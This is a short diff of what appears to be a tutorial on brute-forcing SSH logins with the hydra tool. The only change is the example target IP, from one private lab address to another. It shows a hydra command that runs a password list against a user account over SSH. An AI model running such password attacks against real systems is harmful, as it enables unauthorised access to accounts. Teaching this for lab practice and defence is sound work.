@@ -52,7 +52,7 @@ hydra -l <username> -P <password list file> ssh://<IP address> -V -I -f -t 1
 Example
 
 ```bash
-hydra -l ubuntu -P ./password-list.txt ssh://192.168.24.134 -V -I -f -t 1
+hydra -l ubuntu -P ./password-list.txt ssh://192.168.204.128 -V -I -f -t 1
 ```
 
 - `hydra`: application for running brute force attack
